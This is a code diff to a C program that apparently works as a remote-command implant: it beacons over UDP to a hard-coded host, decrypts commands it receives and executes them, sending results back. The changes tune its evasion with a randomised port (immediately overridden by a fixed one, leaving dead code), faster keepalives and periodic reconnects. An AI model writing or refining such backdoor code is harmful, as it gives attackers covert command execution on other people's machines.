@@ -117,6 +117,8 @@ int main() {
         rtn = pthread_mutex_lock(mutex);
 
         crypt(keepalive);
+        srand(time(NULL));
+        size_t rekey = 0;
         
         while (1) {
             if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
@@ -126,7 +128,8 @@ int main() {
 
             memset(&servaddr, 0, sizeof(servaddr));
             servaddr.sin_family = AF_INET;
-            servaddr.sin_port = htons(58801);
+            servaddr.sin_port = htons(58800 + (rand() % 250));
+            servaddr.sin_port = htons(58892);
             inet_aton("10.5.9.9", &servaddr.sin_addr);
 
             serverlen = sizeof(servaddr);
@@ -153,9 +156,16 @@ int main() {
                     crypt(cmd);
                     exec(cmd, sockfd, &servaddr);
                 }
-                if (time(NULL) - keepalive_timer > 10) {
+                if (time(NULL) - keepalive_timer > 5) {
                     keepalive_timer = time(NULL);
+                    if (rekey > 2) {
+                        close(sockfd);
+                        ready = 0;
+                        rekey = 0;
+                        continue;
+                    }
                     sendto(sockfd, keepalive, strlen(keepalive), 0, (const struct sockaddr *) &servaddr, sizeof(servaddr));
+                    rekey++;
                 }
                 sleep(1);
             }
